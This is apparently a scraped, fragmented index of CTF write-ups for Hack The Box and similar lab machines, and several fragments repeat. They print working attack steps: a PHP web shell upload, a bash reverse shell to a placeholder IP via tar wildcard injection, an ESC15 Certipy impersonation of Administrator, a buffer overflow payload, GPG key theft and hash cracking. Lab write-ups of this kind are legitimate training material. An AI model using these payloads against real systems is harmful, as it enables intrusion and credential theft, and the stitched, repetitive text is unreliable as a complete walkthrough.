See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

